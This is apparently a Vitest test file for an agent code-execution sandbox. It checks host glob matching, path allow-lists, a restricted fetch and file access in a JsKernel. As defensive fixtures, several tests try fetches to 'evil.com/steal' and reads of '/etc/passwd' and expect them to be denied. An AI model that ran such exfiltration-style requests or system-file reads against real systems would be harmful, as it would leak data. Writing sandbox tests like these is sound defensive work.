import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  assertPathAllowed,
  buildCapabilityGlobals,
  buildSandboxFetch,
  matchGlob,
} from "../executor/capabilities.js";
import { JsKernel } from "../executor/JsKernel.js";

describe("matchGlob", () => {
  it("exact match", () => {
    expect(matchGlob("example.com", "example.com")).toBe(true);
    expect(matchGlob("example.com", "other.com")).toBe(false);
  });

  it("wildcard * matches single DNS label (no dots)", () => {
    expect(matchGlob("*.example.com", "api.example.com")).toBe(true);
    expect(matchGlob("*.example.com", "example.com")).toBe(false);
    expect(matchGlob("*.example.com", "a.b.example.com")).toBe(false); // * does not cross dots
    expect(matchGlob("api.*", "api.example")).toBe(true); // single label after dot
    expect(matchGlob("api.*", "api.example.com")).toBe(false); // two labels, not one
  });

  it("wildcard * in middle", () => {
    expect(matchGlob("api.*.com", "api.test.com")).toBe(true);
  });

  it("? matches single character", () => {
    expect(matchGlob("api?.com", "api1.com")).toBe(true);
    expect(matchGlob("api?.com", "api12.com")).toBe(false);
  });
});

describe("assertPathAllowed", () => {
  it("allows paths within allowed prefix", () => {
    expect(() => assertPathAllowed("/tmp/file.txt", ["/tmp"], "read")).not.toThrow();
    expect(() => assertPathAllowed("/data/output.json", ["/data"], "write")).not.toThrow();
  });

  it("throws for paths not in any prefix", () => {
    expect(() => assertPathAllowed("/etc/passwd", ["/tmp"], "read")).toThrow(/CapabilityDenied/);
    expect(() => assertPathAllowed("/home/user", ["/tmp"], "write")).toThrow(/CapabilityDenied/);
  });

  it("throws when no paths allowed", () => {
    expect(() => assertPathAllowed("/tmp/file", [], "read")).toThrow(/CapabilityDenied/);
  });
});

describe("buildSandboxFetch", () => {
  it("returns undefined when no hosts allowed", () => {
    expect(buildSandboxFetch([])).toBeUndefined();
  });

  it("returns a function when hosts are specified", () => {
    expect(typeof buildSandboxFetch(["api.example.com"])).toBe("function");
  });

  it("throws CapabilityDenied for disallowed host", async () => {
    const sandboxFetch = buildSandboxFetch(["api.example.com"])!;
    await expect(sandboxFetch("https://evil.com/steal")).rejects.toThrow(/CapabilityDenied/);
  });
});

describe("buildCapabilityGlobals", () => {
  it("returns empty object when no capabilities given", () => {
    expect(buildCapabilityGlobals(undefined)).toEqual({});
    expect(
      buildCapabilityGlobals({ allowedHosts: [], allowedReadPaths: [], allowedWritePaths: [] })
    ).toEqual({});
  });

  it("injects fetch when allowedHosts is non-empty", () => {
    const globals = buildCapabilityGlobals({ allowedHosts: ["api.example.com"] });
    expect(typeof globals.fetch).toBe("function");
  });

  it("injects __fs__ when path capabilities are granted", () => {
    const globals = buildCapabilityGlobals({ allowedReadPaths: ["/tmp"] });
    expect(globals.__fs__).toBeDefined();
  });

  it("does not inject fetch when allowedHosts is empty", () => {
    const globals = buildCapabilityGlobals({ allowedHosts: [] });
    expect(globals.fetch).toBeUndefined();
  });
});

describe("JsKernel capability enforcement (A2)", () => {
  it("fetch is denied by default (no capabilities)", async () => {
    const kernel = new JsKernel();
    await expect(kernel.run("fetch('https://example.com')")).rejects.toThrow();
  });

  it("fetch is allowed for whitelisted host when capability granted", async () => {
    const kernel = new JsKernel();
    // We can't actually make network calls in tests; just verify fetch is injected.
    const result = await kernel.run("typeof fetch", { allowedHosts: ["api.example.com"] });
    expect(result.output).toBe("function");
  });

  it("fetch is still blocked for non-whitelisted host even with capability", async () => {
    const kernel = new JsKernel();
    // The worker awaits the rejected fetch Promise, so kernel.run() itself rejects
    // with a KernelError wrapping the CapabilityDenied message.
    await expect(
      kernel.run("fetch('https://evil.com/data')", { allowedHosts: ["api.example.com"] })
    ).rejects.toThrow(/CapabilityDenied/);
  });

  it("__fs__ is not available without path capabilities", async () => {
    const kernel = new JsKernel();
    const result = await kernel.run("typeof __fs__");
    expect(result.output).toBe("undefined");
  });

  it("__fs__ is injected when read paths are granted", async () => {
    const kernel = new JsKernel();
    const result = await kernel.run("typeof __fs__", { allowedReadPaths: ["/tmp"] });
    expect(result.output).toBe("object");
  });
});

import { mkdtemp, writeFile as nodeWriteFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

describe("JsKernel __fs__ real I/O (A2)", () => {
  let tmpDir: string;

  beforeEach(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "agentkit-test-"));
  });

  afterEach(async () => {
    await rm(tmpDir, { recursive: true, force: true });
  });

  it("__fs__.readFile reads a real file within allowed path", async () => {
    const filePath = join(tmpDir, "hello.txt");
    await nodeWriteFile(filePath, "hello world", "utf8");

    const kernel = new JsKernel();
    const result = await kernel.run(`__fs__.readFile(${JSON.stringify(filePath)})`, {
      allowedReadPaths: [tmpDir],
    });
    // output is the Promise returned by readFile — await it
    const content = await Promise.resolve(result.output as Promise<string>);
    expect(content).toBe("hello world");
  });

  it("__fs__.readFile rejects for path outside allowedReadPaths", async () => {
    const kernel = new JsKernel();
    // assertPathAllowed throws synchronously inside the vm context,
    // so JsKernel.run() itself rejects with KernelError wrapping CapabilityDenied.
    await expect(
      kernel.run(`__fs__.readFile("/etc/passwd")`, { allowedReadPaths: [tmpDir] })
    ).rejects.toThrow(/CapabilityDenied/);
  });

  it("__fs__.writeFile writes a real file within allowed path", async () => {
    const filePath = join(tmpDir, "out.txt");
    const kernel = new JsKernel();
    const result = await kernel.run(
      `__fs__.writeFile(${JSON.stringify(filePath)}, "written by agent")`,
      { allowedWritePaths: [tmpDir] }
    );
    await Promise.resolve(result.output); // wait for write

    const { readFile } = await import("node:fs/promises");
    const content = await readFile(filePath, "utf8");
    expect(content).toBe("written by agent");
  });

  it("__fs__.writeFile rejects for path outside allowedWritePaths", async () => {
    const kernel = new JsKernel();
    // assertPathAllowed throws synchronously, so run() itself rejects.
    await expect(
      kernel.run(`__fs__.writeFile("/etc/nope.txt", "bad")`, { allowedWritePaths: [tmpDir] })
    ).rejects.toThrow(/CapabilityDenied/);
  });
});
